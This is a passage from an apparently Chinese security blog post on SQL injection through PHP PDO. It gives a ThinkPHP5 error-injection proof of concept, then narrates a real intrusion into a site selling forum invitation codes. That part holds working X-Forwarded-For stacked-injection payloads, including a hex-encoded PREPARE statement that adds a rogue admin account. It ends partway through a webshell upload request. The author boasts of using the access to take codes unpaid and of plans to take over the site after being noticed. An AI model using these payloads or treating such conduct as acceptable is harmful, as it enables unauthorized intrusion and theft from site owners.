        PDO::ATTR_ERRMODE           => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_EMULATE_PREPARES  => false,
    ];
    $db = new PDO('mysql:dbname=cat;host=127.0.0.1;', 'root', 'root', $params);
    try {
        $link = $db->prepare('SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))');
    } catch (\PDOException $e) {
        var_dump($e);
    }
执行发现，虽然我只调用了prepare函数，但原SQL语句中的报错已经成功执行：
[
究其原因，是因为我这里设置了`PDO::ATTR_EMULATE_PREPARES => false`。
这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后`execute()`的时候才发送给数据库执行；如果我这里设置了`PDO::ATTR_EMULATE_PREPARES
=> false`，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。
非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing->resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization->execution）。
这时，假设在第一步执行`prepare($SQL)`的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步。我们看看ThinkPHP5的默认配置：
    ...
    // PDO连接参数
    protected $params = [
        PDO::ATTR_CASE              => PDO::CASE_NATURAL,
        PDO::ATTR_ERRMODE           => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_ORACLE_NULLS      => PDO::NULL_NATURAL,
        PDO::ATTR_STRINGIFY_FETCHES => false,
        PDO::ATTR_EMULATE_PREPARES  => false,
    ];
    ...
可见，这里的确设置了`PDO::ATTR_EMULATE_PREPARES =>
false`。所以，终上所述，我构造如下POC，即可利用报错注入，获取user()信息：
http://localhost/thinkphp5/public/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1231
[
但是，如果你将user()改成一个子查询语句，那么结果又会爆出`Invalid parameter number: parameter was not
defined`的错误。
因为没有过多研究，说一下我猜测：预编译的确是mysql服务端进行的，但是预编译的过程是不接触数据的
，也就是说不会从表中将真实数据取出来，所以使用子查询的情况下不会触发报错；虽然预编译的过程不接触数据，但类似user()这样的数据库函数的值还是将会编译进SQL语句，所以这里执行并爆了出来。
## 0x05 实战案例-从cl社区激活码到Git 2000+ Star项目0day
#### 5.1 起因
挖SRC，做项目做的心生烦闷，前几日忍不住在家看1024(cl)社区，越看越来劲，邪火攻心，想搜片看
奈何cl社区一向奉行邀请制，邀请码又很难搞到，可谓让人十分不爽
于是本人去google上找了一个卖1024社区邀请码的站
88块钱....虽然不算贵，但售卖这种东西本来就是不受法律保护的。作为一个JB小子，怎么可能不动点白嫖心思？
在黑盒测试了一段时间后，发现支付逻辑和前台都没什么安全问题。。难道我真的要花钱买这激活码？？？？
不可能，绝对不可能。
看到网站底部有一个Powered by xxx，呵呵呵，好家伙，不出意外这应该就是这个站用的CMS系统了
去Git上一搜，还真有，2000多个Star，作者维护了好几年，也算是个成熟的项目了。
直接把最新版源码下载下来，丢进PHPstorm里开始审计
#### 5.2 从审计思路到PDO导致的前台XFF堆叠注入
就我个人而言，拿到一套源码，我更喜欢黑白盒相结合；根据前台能访问到的功能点来确定自己审计的目标
简单看了一下整套系统是MVC架构的，使用了PDO，使用有部分过滤规则；后台默认路径是/admin
看了一遍前台的功能点，发现在查询订单处路径名很有趣，带有一个/query，直接搜一下页面上关键词，跟进入到源码中
发现了如下的一段code
PDO均为默认配置，立马想到了堆叠注入
经测试orderid用户可控，全局搜索orderid发现，orderid经函数方法后被处理为纯字符串，没有注入余地，故选择另辟蹊径
后发现ip参数用户同样可控，在调用select方法前没做任何处理。
ip参数调用的是getClientIP方法，我们跟一下getClientIP方法
很好理解，就是从常见的http header中获取客户端IP
但是非常高兴，ip参数未做任何处理，我们可以通过构造XFF头来实现堆叠注入
因为有csrf_token的校验，我们必须在查询订单的页面，随便输入个订单号，随后输入正确的验证码，随后查询才有效
随后手动构造XFF头，进行针对PDO的堆叠注入
因为PDO处为双引号进行语句闭合，且属于无回显的堆叠注入
故构造Payload为
    X-FORWARDED-For:1';select sleep(5)#
延迟了5s，注入成功。
针对这种没回显的堆叠注入，盲注太慢，用Dnslog OOB又太慢，所以选择构造一个添加后台管理员的insert payload
    X-FORWARDED-For:1“;insert into t_admin_user values(99,"PI:EMAIL","76b1807fc1c914f15588520b0833fbc3","78e055",0);
但是现实是很残酷的，测试发现，在XFF头中，1"将语句闭合后只要出现了引号或者逗号，就会引发报错，SQL语句无法执行
但是具有一定审计经验的兄弟一定会想到，PDO下Prepare Statement给我们提供了绕过过滤进行注入的沃土
山重水复疑无路，柳暗花明又一村
#### 5.3 Prepare Statement构造注入语句
**知识补充 --- Prepare Statement写法**
MySQL官方将prepare、execute、deallocate统称为PREPARE STATEMENT(预处理)
预制语句的SQL语法基于三个SQL语句：
    prepare stmt_name from preparable_stmt;
    execute stmt_name [using @var_name [, @var_name] ...];
    {deallocate | drop} prepare stmt_name;
给出MYSQL中两个简单的demo
    set@a="select user()";PREPARE a FROM @a;execute a;select sleep(3);#
    set@a=0x73656C65637420757365722829;PREPARE a FROM @a;execute a;select sleep(3);#  
    //73656C65637420757365722829为select user() 16进制编码后的字符串，前面再加上0x声明这是一个16进制字符串
Prepare语句在防范SQL注入方面起到了非常大的作用，但是对于SQL注入攻击却也提供了新的手段。
Prepare语句最大的特点就是它可以将16进制串转为语句字符串并执行。如果我们发现了一个存在堆叠注入的场景，但过滤非常严格，便可以使用prepare语句进行绕过。
将我们的insert语句直接hex编码
构造注入语句
    X-FORWARDED-For:1";set@a=0x696E7365727420696E746F20745F61646D696E5F757365722076616C7565732839392C227465737440746573742E74657374222C223736623138303766633163393134663135353838353230623038333366626333222C22373865303535222C30293B;PREPARE a FROM @a;execute a;select sleep(3);#
    //sleep用于判断注入是否成功
延时3s，注入成功，成功添加了一个账号为PI:EMAIL，密码为123456的后台管理员
直接默认后台路径/admin登录后台
前台提交一个cl社区邀请码的订单
后台修改订单状态为确认付款
没过一会，邀请码直接到邮箱
以后可以搜片看了
#### 5.4 不讲武德被发现
在不讲武德，连续薅了几个邀请码，发给朋友后
站长终于发现了
八嘎，既然发现了，那就干脆把你的站日下来吧，然后好好擦擦屁股，免得0day被这站长抓走
#### 5.5 后台Getshell审计(Thanks 17@M78sec)
经测试后台的文件上传处鉴权比较严格，没法直接前台getshell
但是后台文件上传处，没有对文件扩展名进行任何过滤，只有一处前端js校验，所以后台getshell直接白给
文件上传后不会返回上传路径，但上传路径和上传文件的命名规则我们已经了如指掌
UPLOAD_PATH定义如下
    define('UPLOAD_PATH', APP_PATH.'/public/res/upload/');
CUR_DATE定义如下
    define('CUR_DATE', date('Y-m-d'));
文件名
    $filename=date("His");  //小时+分钟+秒
以我现在21点05分钟为例，输出结果如下
以2021年5月26日的21点05分44秒为例
完整的文件路径即为
    http://www.xxx.com/res/upload/2021-05-26/210444.php
直接构造表单
        File:
同时需要添加Referer: http://xxx.top/Admin/products/imgurl/?id=1,并修改下方的
否则会提示“请选择商品id”
最后完整的上传http request如下
    POST http://xxx.top/Admin/products/imgurlajax HTTP/1.1
    Host: xxxx
    Content-Length: 291
    Accept: application/json, text/javascript, */*; q=0.01
    DNT: 1
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeSrhtSPGxub0H0eb
    Origin: http://47.105.132.207
    Referer: http://xxx.top/Admin/products/imgurl/?id=12
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Cookie: PHPSESSID=ql4ep5uk8cf9i0rvihrruuilaq
    Connection: close
    ------WebKitFormBoundaryeSrhtSPGxub0H0eb
    Content-Disposition: form-data; name="file"; filename="test.php"
    Content-Type: image/png
* * *